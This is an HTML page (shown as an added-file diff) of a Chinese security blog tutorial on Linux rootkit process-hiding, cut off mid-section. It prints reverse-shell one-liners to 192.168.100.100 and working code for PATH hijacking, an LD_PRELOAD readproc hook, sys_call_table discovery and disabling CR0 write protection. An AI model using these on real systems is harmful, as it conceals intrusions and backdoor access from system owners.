@@ -1,0 +1,1142 @@
+<!DOCTYPE html>
+<html  lang="en">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 4.2.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>看不到的後門 - ROOTKIT 隱藏程序技巧 - oalieno blog</title>
+
+
+    <meta name="description" content="簡報版本 : https:&#x2F;&#x2F;www.slideshare.net&#x2F;ssuserd44fa2&#x2F;rootkit-101-228943978  root + kit 的意思就是拿到 root 權限後可以用的工具包，大多是隱藏程序的技巧，所以 rootkit 也可以理解成隱藏程序技術的通稱，不過也有些不需要 root 的隱藏程序技術，今天會逐一介紹 linux 上 rootkit 的原理與實作 隱之呼吸">
+<meta property="og:type" content="article">
+<meta property="og:title" content="看不到的後門 - ROOTKIT 隱藏程序技巧">
+<meta property="og:url" content="https://oalieno.github.io/2019/06/07/security/pwn/rootkit/index.html">
+<meta property="og:site_name" content="oalieno blog">
+<meta property="og:description" content="簡報版本 : https:&#x2F;&#x2F;www.slideshare.net&#x2F;ssuserd44fa2&#x2F;rootkit-101-228943978  root + kit 的意思就是拿到 root 權限後可以用的工具包，大多是隱藏程序的技巧，所以 rootkit 也可以理解成隱藏程序技術的通稱，不過也有些不需要 root 的隱藏程序技術，今天會逐一介紹 linux 上 rootkit 的原理與實作 隱之呼吸">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://oalieno.github.io/images/ogimage.jpg">
+<meta property="article:published_time" content="2019-06-06T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-08-29T12:04:21.936Z">
+<meta property="article:author" content="oalieno">
+<meta property="article:tag" content="security">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="rootkit">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://oalieno.github.io/images/ogimage.jpg">
+
+
+
+
+<link rel="canonical" href="https://oalieno.github.io/2019/06/07/security/pwn/rootkit/"/>
+
+
+
+
+<link rel="icon" href="/images/favicon.svg">
+
+<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/bottom-to-top.css">
+
+
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-87869756-1"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'UA-87869756-1');
+</script>
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    <script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+</head>
+<body class="is-2-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 64 64" width="25" height="25" style="margin-right: 10px"><g id="flat"><path d="M52,23a20,20,0,0,0-40,0V53a4,4,0,0,0,8,0V48a4,4,0,0,0,8,0v9a4,4,0,0    ,0,8,0V44a4,4,0,0,0,8,0V55a4,4,0,0,0,8,0Z" style="fill:#f98c96"/><rect x="19" y="44" width="2" height="2" style="fill:#e4544f"/><rect x="43" y="40" width="2" height="2" style    ="fill:#e4544f"/><path d="M32,37A12,12,0,0,0,44,25H20A12,12,0,0,0,32,37Z" style="fill:#fff"/><path d="M32,33a8,8,0,0,0,8-8H24A8,8,0,0,0,32,33Z" style="fill:#ffd782"/><path d=    "M32,29a4,4,0,0,0,4-4H28A4,4,0,0,0,32,29Z" style="fill:#e4544f"/><path d="M32,13h0A12,12,0,0,1,44,25v0a0,0,0,0,1,0,0H20a0,0,0,0,1,0,0v0A12,12,0,0,1,32,13Z" style="fill:#394d5    c"/><path d="M26,22H24c0-4.746,5.233-6,8-6l0,2C31.757,18,26,18.064,26,22Z" style="fill:#98a5a6"/><path d="M44.132,14.5C40.476,8.1,32.083,8,32,8V6c.392,0,9.629.085,13.868,7.5Z    " style="fill:#e4544f"/><circle cx="7" cy="10" r="3" style="fill:#f98c96"/><circle cx="57" cy="7" r="4" style="fill:#f98c96"/><circle cx="59" cy="37" r="3" style="fill:#f98c9    6"/><circle cx="5" cy="27" r="2" style="fill:#f98c96"/></g></svg>
+                oalieno blog
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">首頁</a>
+                
+                <a class="navbar-item"
+                href="/archives/">歷史文章</a>
+                
+                <a class="navbar-item"
+                href="/categories/">分類</a>
+                
+                <a class="navbar-item"
+                href="/tags/">標籤</a>
+                
+                <a class="navbar-item"
+                href="/about/">關於我</a>
+                
+                <a class="navbar-item"
+                href="/old/">舊部落格</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                
+                
+                <a class="navbar-item search" title="Search" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+                <a class="navbar-item github-source" href="https://github.com/oalieno/oalieno.github.io">
+                    <div class="github-source-icon"><i class="fab fa-lg fa-github-alt"></i></div>
+                    <div class="github-source-repository">
+                        oalieno/oalieno.github.io
+                    </div>
+                </a>
+            </div>
+        </div>
+    </div>
+</nav>
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-9-tablet is-9-desktop is-9-widescreen has-order-2 column-main">
+<div class="card ">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2019-06-06T16:00:00.000Z">2019-06-07</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/security/">security</a>&nbsp;/&nbsp;<a class="has-link-grey -link" href="/categories/security/pwn/">pwn</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    16 minutes read (About 2365 words)
+                </span>
+                
+                
+                <span class="level-item has-text-grey" id="busuanzi_container_page_pv">
+                    <i class="far fa-eye"></i>
+                    <span id="busuanzi_value_page_pv">0</span> visits
+                </span>
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                看不到的後門 - ROOTKIT 隱藏程序技巧
+            
+        </h1>
+        <div class="content">
+            <p>簡報版本 : <a href="https://www.slideshare.net/ssuserd44fa2/rootkit-101-228943978">https://www.slideshare.net/ssuserd44fa2/rootkit-101-228943978</a></p>
+<hr>
+<p>root + kit 的意思就是拿到 root 權限後可以用的工具包，大多是隱藏程序的技巧，所以 rootkit 也可以理解成隱藏程序技術的通稱，不過也有些不需要 root 的隱藏程序技術，今天會逐一介紹 linux 上 rootkit 的原理與實作</p>
+<h2 id="隱之呼吸壹之型-PATH-Hijack"><a class="header-anchor" href="#隱之呼吸壹之型-PATH-Hijack"></a>隱之呼吸壹之型 - PATH Hijack</h2>
+<h3 id="條件"><a class="header-anchor" href="#條件"></a>條件</h3>
+<p>不需要 root</p>
+<h3 id="目標"><a class="header-anchor" href="#目標"></a>目標</h3>
+<p>在 <code>ps</code> 的結果中隱藏下面兩種簡單的後門</p>
+<ol>
+<li><code>bash -i &gt;&amp; /dev/tcp/192.168.100.100/9999 0&gt;&amp;1</code></li>
+<li><code>socat TCP:192.168.100.100:9999 EXEC:/bin/bash</code></li>
+</ol>
+<h3 id="手法"><a class="header-anchor" href="#手法"></a>手法</h3>
+<p>假設在 <code>$PATH</code> 環境變數中 <code>/usr/local/bin</code> 在 <code>/bin</code> 前面，所以我們可以寫一個檔案在 <code>/usr/local/bin/ps</code>，這樣 <code>ps</code> 就會執行 <code>/usr/local/bin/ps</code> 而不是 <code>/bin/ps</code>，而達到 hook 程序的效果</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">/bin/ps <span class="variable">$@</span> | grep -Ev <span class="string">'192.168.100.100|socat'</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><code>grep -Ev</code> 是 inverse match</li>
+<li><code>$@</code> 是傳進來的參數 ( 這裡原封不動的交給 <code>/bin/ps</code> )</li>
+</ul>
+<h2 id="隱之呼吸貳之型-LD-PRELOAD"><a class="header-anchor" href="#隱之呼吸貳之型-LD-PRELOAD"></a>隱之呼吸貳之型 - LD_PRELOAD</h2>
+<h3 id="條件-v2"><a class="header-anchor" href="#條件-v2"></a>條件</h3>
+<p>不需要 root</p>
+<h3 id="目標-v2"><a class="header-anchor" href="#目標-v2"></a>目標</h3>
+<p>在 <code>ps</code> 的結果中隱藏下面兩種簡單的後門</p>
+<ol>
+<li><code>bash -i &gt;&amp; /dev/tcp/192.168.100.100/9999 0&gt;&amp;1</code></li>
+<li><code>socat TCP:192.168.100.100:9999 EXEC:/bin/bash</code></li>
+</ol>
+<h3 id="要-hook-哪個函式"><a class="header-anchor" href="#要-hook-哪個函式"></a>要 hook 哪個函式</h3>
+<p>首先我們可以用 <code>ltrace</code> 看 <code>ps</code> 跑起來呼叫了哪些 library 的函式</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">fwrite(<span class="string">" [jfsCommit]\nhe]\n4\n0\n\nstart\ngrou"</span>..., <span class="number">13</span>, <span class="number">1</span>, <span class="number">0x7fbfcd303760</span>)  = <span class="number">1</span></span><br><span class="line">readproc(<span class="number">0x55e061b12f90</span>, <span class="number">0x55e0609d1540</span>, <span class="number">13</span>, <span class="number">1024</span>)                          = <span class="number">0x55e0609d1540</span></span><br><span class="line">escape_str(<span class="number">0x7fbfcd90b090</span>, <span class="number">0x55e0609d1740</span>, <span class="number">0x20000</span>, <span class="number">0x7fff6f748044</span>)         = <span class="number">4</span></span><br><span class="line"><span class="built_in">strlen</span>(<span class="string">"root"</span>)                                                              = <span class="number">4</span></span><br><span class="line">fwrite(<span class="string">"root"</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">0x7fbfcd303760</span>)                                        = <span class="number">1</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>會發現 <code>readproc</code> 一直出現，查看一下 man page</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">       readproc, freeproc  - read information from next &#x2F;proc&#x2F;## entry</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       #include &lt;proc&#x2F;readproc.h&gt;</span><br><span class="line"></span><br><span class="line">       proc_t* readproc(PROCTAB *PT, proc_t *return_buf);</span><br><span class="line">       void freeproc(proc_t *p);</span><br></pre></td></tr></table></figure>
+<p>那我們就在 <code>ps</code> 的原始碼中找一下 <code>readproc</code> 的用法，如下</p>
+<figure class="highlight c"><figcaption><span>procps-3.2.8/ps/display.c >331</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ptp = openproc(needs_for_format | needs_for_sort | needs_for_select | needs_for_threads);</span><br><span class="line"><span class="keyword">if</span>(!ptp) &#123;</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error: can not access /proc.\n"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memset</span>(&amp;buf, <span class="string">'#'</span>, <span class="keyword">sizeof</span>(<span class="keyword">proc_t</span>));</span><br><span class="line"><span class="keyword">switch</span>(thread_flags &amp; (TF_show_proc|TF_loose_tasks|TF_show_task))&#123;</span><br><span class="line"><span class="keyword">case</span> TF_show_proc:                   <span class="comment">// normal non-thread output</span></span><br><span class="line">  <span class="keyword">while</span>(readproc(ptp,&amp;buf))&#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
+<details class="admonition question" open><summary>如何取得 ps 原始碼</summary><p><p><code>ps</code> 這個指令是來自 <code>procps</code>，可以從 <a href="http://procps.sourceforge.net/">procps.sourceforge.net</a> 下載<br>
+另外其他基本的 shell 指令的原始碼則可以從 <a href="https://www.gnu.org/software/coreutils/">www.gnu.org/software/coreutils</a> 下載</p>
+</p></details>
+<ul>
+<li>基本上就是先 <code>openproc</code> 然後再用 <code>readproc</code> 一次讀一個 process entry</li>
+<li><code>ptp</code> 的型態是 <a href="https://fossies.org/dox/procps-3.2.8/structPROCTAB.html"><code>PROCTAB*</code></a>，裡面有 linked list 的結構，讓程式能找到下一個 process</li>
+<li><code>buf</code> 的型態是 <a href="https://fossies.org/dox/procps-3.2.8/structproc__t.html"><code>proc_t*</code></a>，包含了 process 的資訊</li>
+<li>那我們就去 hook <code>readproc</code> 這個函式，把想隱藏的 procss 跳過</li>
+</ul>
+<h3 id="dlsym"><a class="header-anchor" href="#dlsym"></a>dlsym</h3>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeof(readproc) *old_readproc = dlsym(RTLD_NEXT, <span class="string">"readproc"</span>);</span><br></pre></td></tr></table></figure>
+<ul>
+<li>這行是 <code>LD_PRELOAD</code> 技巧的關鍵，我們用 <code>dlsym</code> 這個函式來找 symbol 的位址</li>
+<li>放 <code>RTLD_NEXT</code> 這個參數會找下一個 symbol 而不是第一個</li>
+<li><code>typeof(readproc)</code> 只是一個語法糖，代表 <code>readproc</code> 這個 function pointer 的型態</li>
+</ul>
+<h3 id="POC-原始碼"><a class="header-anchor" href="#POC-原始碼"></a>POC 原始碼</h3>
+<figure class="highlight c"><figcaption><span>hook.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;proc/readproc.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hidden</span> <span class="params">(<span class="keyword">char</span> *target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *keywords[<span class="number">2</span>] = &#123; <span class="string">"192.168.100.100"</span>, <span class="string">"socat"</span> &#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">2</span>; i++) <span class="keyword">if</span> (<span class="built_in">strstr</span>(target, keywords[i])) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">proc_t</span>* <span class="title">readproc</span> <span class="params">(PROCTAB *PT, <span class="keyword">proc_t</span> *return_buf)</span> </span>&#123;</span><br><span class="line">    typeof(readproc) *old_readproc = dlsym(RTLD_NEXT, <span class="string">"readproc"</span>);</span><br><span class="line">    <span class="keyword">proc_t</span>* ret_value = old_readproc(PT, return_buf);</span><br><span class="line">    <span class="keyword">while</span> (ret_value</span><br><span class="line">        &amp;&amp; ret_value-&gt;cmdline</span><br><span class="line">        &amp;&amp; hidden(ret_value-&gt;cmdline[<span class="number">0</span>])) &#123;</span><br><span class="line">        ret_value = old_readproc(PT, return_buf);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret_value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="編譯"><a class="header-anchor" href="#編譯"></a>編譯</h3>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o hook.so hook.c</span><br></pre></td></tr></table></figure>
+<h3 id="執行"><a class="header-anchor" href="#執行"></a>執行</h3>
+<ul>
+<li>指定 <code>LD_PRELOAD</code> 環境變數來載入編譯好的動態連結庫，但只有該次生效</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LD_PRELOAD=/path/to/hook.so ps aux</span><br></pre></td></tr></table></figure>
+<ul>
+<li>或是編輯 <code>ld.so.preload</code>，寫入 <code>hook.so</code> 的路徑，之後每次執行都會載入，可以用 <code>ldd</code> 查看是否成功 preload</li>
+</ul>
+<h3 id="DEMO"><a class="header-anchor" href="#DEMO"></a>DEMO</h3>
+<script id="asciicast-0M5KQUVkrY4Ha0gOOSS9pj97K" src="https://asciinema.org/a/0M5KQUVkrY4Ha0gOOSS9pj97K.js" async></script>
+<h2 id="隱之呼吸參之型-Loadable-Kernel-Module"><a class="header-anchor" href="#隱之呼吸參之型-Loadable-Kernel-Module"></a>隱之呼吸參之型 - Loadable Kernel Module</h2>
+<h3 id="條件-v3"><a class="header-anchor" href="#條件-v3"></a>條件</h3>
+<p>需要 root</p>
+<h3 id="目標-v3"><a class="header-anchor" href="#目標-v3"></a>目標</h3>
+<p>在 <code>ls</code> 的結果中隱藏 <code>rootkit.ko</code></p>
+<h3 id="取得-sys-call-table"><a class="header-anchor" href="#取得-sys-call-table"></a>取得 sys_call_table</h3>
+<p>首先因為我們要 hijack system call 所以要先取得 <code>sys_call_table</code> 的位址</p>
+<h4 id="方法一"><a class="header-anchor" href="#方法一"></a>方法一</h4>
+<ul>
+<li>在 2.4 以前的內核版本，預設導出所有符號，所以可以直接用</li>
+<li>如果自己編譯內核的話，可以修改原始碼用 <code>EXPORT_SYMBOL</code> 把 <code>sys_call_table</code> 的符號導出來</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">void</span> *sys_call_table[];</span><br></pre></td></tr></table></figure>
+<h4 id="方法二"><a class="header-anchor" href="#方法二"></a>方法二</h4>
+<p><code>kallsyms_lookup_name</code> 這個函式也可以抓位址，但他也不一定會被導出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/kallsyms.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> **sys_call_table;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> __init <span class="title">hook_init</span> <span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    sys_call_table = (<span class="keyword">void</span> **)kallsyms_lookup_name(<span class="string">"sys_call_table"</span>);</span><br><span class="line">    printk(KERN_INFO <span class="string">"sys_call_table = 0x%px\n"</span>, sys_call_table);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<details class="admonition question" open><summary>How to printk a pointer ?</summary><p><p>要用 printk 印出 pointer 可以用 <code>%px</code><br>
+<code>%p</code> 只會印出該指標的雜湊值而不是真正的指標的值，這是為了避免洩漏內核位址</p>
+</p></details>
+<h4 id="方法三"><a class="header-anchor" href="#方法三"></a>方法三</h4>
+<ul>
+<li>下面兩個檔案路徑有可能會有 sys_call_table 的位址</li>
+<li>/proc/kallsyms 是一個特殊的檔案，會在讀取時動態產生</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /boot/System.map-$(uname -r) | grep <span class="string">"sys_call_table"</span></span><br><span class="line">cat /proc/kallsyms | grep  <span class="string">"sys_call_table"</span></span><br></pre></td></tr></table></figure>
+<h4 id="方法四"><a class="header-anchor" href="#方法四"></a>方法四</h4>
+<ul>
+<li>最穩的方式是自己去 kernel 裡面撈 memory</li>
+<li>想法源自於<a href="http://phrack.org/issues/58/7.html">這篇</a>，但 kernel 5.x.x 有多包了一層 <code>do_syscall_64</code>，需要做一些改動</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint8_t</span> *<span class="title">get_syscalltable</span> <span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lo, hi;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">"rdmsr"</span> : <span class="string">"=a"</span> (lo), <span class="string">"=d"</span> (hi) : <span class="string">"c"</span> (MSR_LSTAR))</span></span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> *entry_SYSCALL_64 = (<span class="keyword">uint8_t</span> *)(((<span class="keyword">uint64_t</span>)hi &lt;&lt; <span class="number">32</span>) | lo);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> *ptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> do_syscall_64_inst[<span class="number">7</span>] = &#123;</span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xc7</span>, <span class="comment">// mov rdi, rax</span></span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x89</span>, <span class="number">0xe6</span>, <span class="comment">// mov rsi, rsp</span></span><br><span class="line">        <span class="number">0xe8</span>,             <span class="comment">// call do_syscall_64</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ptr = <span class="built_in">find</span>(entry_SYSCALL_64, do_syscall_64_inst, <span class="number">7</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *do_syscall_64 = (<span class="keyword">uint8_t</span> *)(ptr + <span class="number">11</span> + ((<span class="keyword">uint64_t</span>)<span class="number">0xffffffff00000000</span> | *(<span class="keyword">uint32_t</span> *)(ptr + <span class="number">7</span>)));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> sys_call_table_inst[<span class="number">4</span>] = &#123;</span><br><span class="line">        <span class="number">0x48</span>, <span class="number">0x8b</span>, <span class="number">0x04</span>, <span class="number">0xfd</span> <span class="comment">// mov rax, QWORD PTR [rdi*8-?]</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ptr = <span class="built_in">find</span>(do_syscall_64, sys_call_table_inst, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *sys_call_table = (<span class="keyword">uint8_t</span> *)((<span class="keyword">uint64_t</span>)<span class="number">0xffffffff00000000</span> | *(<span class="keyword">uint32_t</span> *)(ptr + <span class="number">4</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sys_call_table;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>要理解上面的程式碼在做什麼，我們需要知道下面兩件事</p>
+<h5 id="Module-Specific-Register-是什麼"><a class="header-anchor" href="#Module-Specific-Register-是什麼"></a>Module Specific Register 是什麼 ?</h5>
+<ul>
+<li>module specific register 是一塊跟 CPU 有關的暫存器</li>
+<li>每個 msr 都會有個 index，可以想像成一個很大的陣列</li>
+<li>用 <code>rdmsr</code>, <code>wrmsr</code> 這組 instructions 可以對 msr 做讀寫，必須提供 index</li>
+<li>kernel 一開始在初始化的時候，把 <code>entry_SYSCALL_64</code> 寫到 <code>msr[MSR_LSTAR]</code></li>
+</ul>
+<h5 id="syscall-執行下去實際上是發生什麼事"><a class="header-anchor" href="#syscall-執行下去實際上是發生什麼事"></a>syscall 執行下去實際上是發生什麼事 ?</h5>
+<ol>
+<li>使用者呼叫 <code>syscall</code></li>
+<li>切換到 ring 0</li>
+<li>跳去 msr[MSR_LSTAR] 這個位址也就是 <code>entry_SYSCALL_64</code> 這裡</li>
+<li>呼叫 <code>do_syscall_64</code></li>
+<li><code>regs-&gt;ax = sys_call_table[nr](regs);</code> 這行呼叫對應的函式</li>
+</ol>
+<h4 id="解讀上面的程式碼的步驟"><a class="header-anchor" href="#解讀上面的程式碼的步驟"></a>解讀上面的程式碼的步驟</h4>
+<ol>
+<li>我們已經在 ring 0 了</li>
+<li>直接用 <code>rdmsr</code> 讀 <code>msr[MSR_LSTAR]</code></li>
+<li>直接在 <code>entry_SYSCALL_64</code> 的 instructions 裡面找下面這個 pattern</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movq %rax, %rdi,</span><br><span class="line">movq %rsp, %rsi</span><br><span class="line">call do_syscall_64</span><br></pre></td></tr></table></figure>
+<ol start="4">
+<li>這樣就找到 <code>do_syscall_64</code> 了</li>
+<li>進到 <code>do_syscall_64</code> 後，一樣畫葫蘆，再找下面這個 pattern</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax, QWORD PTR [rdi*8-?]</span><br></pre></td></tr></table></figure>
+<ol start="6">
+<li>最後，這個問號的值就會是 <code>sys_call_table</code> 的位址</li>
+</ol>
+<h3 id="讓-sys-call-table-可以寫入"><a class="header-anchor" href="#讓-sys-call-table-可以寫入"></a>讓 <code>sys_call_table</code> 可以寫入</h3>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Control_register#CR0">cr0 register</a> 的其中一個 bit 是代表 read-only 區段可不可寫，改成 0 就通通可寫啦</li>
+<li><code>write_cr0</code> 這個 function 在 kernel 5.x.x 版加了檢查，不過我們直接寫 assembly 就沒問題啦</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writable_unlock</span> <span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> val = read_cr0() &amp; (~X86_CR0_WP);</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">"mov %0,%%cr0"</span>: <span class="string">"+r"</span> (val))</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">writable_lock</span> <span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> val = read_cr0() | X86_CR0_WP;</span><br><span class="line">    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">"mov %0,%%cr0"</span>: <span class="string">"+r"</span> (val))</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="要-hook-哪個-syscall"><a class="header-anchor" href="#要-hook-哪個-syscall"></a>要 hook 哪個 syscall</h3>
+<ul>
